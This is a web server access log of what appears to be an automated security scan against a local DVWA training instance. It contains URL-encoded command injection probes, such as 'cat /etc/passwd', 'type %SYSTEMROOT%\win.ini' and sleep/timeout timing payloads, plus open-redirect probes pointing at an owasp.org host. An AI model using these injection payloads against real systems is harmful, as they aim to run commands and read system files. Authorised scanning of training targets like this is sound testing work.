172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "POST /setup.php HTTP/1.1" 302 300 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%26sleep+15%26 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%3Bsleep+15%3B HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%22%26sleep+15%26%22 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%27%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%26timeout+%2FT+15 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%7Ctimeout+%2FT+15 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%22%26timeout+%2FT+15%26%22 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%22%7Ctimeout+%2FT+15 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%26timeout+%2FT+%7B0%7D%26 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%7Ctimeout+%2FT+%7B0%7D HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%3Bget-help HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%22%3Bget-help HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%27%3Bget-help HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%3Bget-help+%23 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%3Bstart-sleep+-s+15 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%22%3Bstart-sleep+-s+15 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%3Bstart-sleep+-s+%7B0%7D HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /sitemap.xml?query=query%3Bstart-sleep+-s+15+%23 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET / HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /about.php/ HTTP/1.1" 200 13012 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:40 +0000] "GET /login.php HTTP/1.1" 200 1795 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:41 +0000] "GET /docs/ HTTP/1.1" 200 1308 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:41 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:41 +0000] "GET /docs/DVWA_v1.3.pdf/ HTTP/1.1" 404 455 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:41 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:41 +0000] "GET /dvwa/ HTTP/1.1" 200 1674 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:41 +0000] "GET /dvwa/css/ HTTP/1.1" 200 1703 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:41 +0000] "GET /dvwa/css/login.css/ HTTP/1.1" 404 455 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:41 +0000] "GET /dvwa/images HTTP/1.1" 301 534 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:41 +0000] "GET /dvwa/css/main.css/ HTTP/1.1" 404 454 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:41 +0000] "GET /dvwa/images/ HTTP/1.1" 200 2341 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:41 +0000] "GET /dvwa/images/login_logo.png/ HTTP/1.1" 404 463 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:41 +0000] "GET /dvwa/images/logo.png/ HTTP/1.1" 404 457 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:41 +0000] "GET /dvwa/images/RandomStorm.png/ HTTP/1.1" 404 464 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:41 +0000] "GET /dvwa/js HTTP/1.1" 301 526 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:41 +0000] "GET /dvwa/images/spanner.png/ HTTP/1.1" 404 460 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:41 +0000] "GET /dvwa/js/ HTTP/1.1" 200 1347 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:41 +0000] "GET /dvwa/js/add_event_listeners.js/ HTTP/1.1" 404 467 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /dvwa/js/dvwaPage.js/ HTTP/1.1" 404 456 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /favicon.ico/ HTTP/1.1" 404 448 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /instructions.php/ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /instructions.php/ HTTP/1.1" 200 14305 "http://127.0.0.1:8080/instructions.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /login.php/ HTTP/1.1" 200 1795 "http://127.0.0.1:8080" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "POST /login.php/ HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /login.php/login.php HTTP/1.1" 200 1845 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /robots.txt/ HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /setup.php/ HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "POST /setup.php/ HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /setup.php/setup.php HTTP/1.1" 200 4428 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /sitemap.xml/ HTTP/1.1" 404 448 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /?query=393116451647016622.owasp.org HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /about.php?query=393116451647016622.owasp.org HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /about.php?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 302 300 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /about.php?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /about.php?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /about.php?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /about.php?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /about.php?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /about.php?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /about.php?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /docs?query=393116451647016622.owasp.org HTTP/1.1" 301 590 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /dvwa HTTP/1.1" 301 520 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /docs?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 616 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /docs?query=https%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 618 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /docs?query=http%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 301 616 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /docs?query=https%3A%5C%5C393116451647016622.owasp.org HTTP/1.1" 301 618 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /docs?query=%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 602 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /docs?query=%5C%5C393116451647016622.owasp.org HTTP/1.1" 301 602 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /docs?query=HtTp%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 616 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /docs?query=HtTpS%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 301 618 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:42 +0000] "GET /docs/DVWA_v1.3.pdf?query=393116451647016622.owasp.org HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /docs/DVWA_v1.3.pdf?query=http%3A%2F%2F393116451647016622.owasp.org HTTP/1.1" 200 422251 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa?query=393116451647016622.owasp.org HTTP/1.1" 301 590 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:43 +0000] "GET /dvwa/css HTTP/1.1" 301 528 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
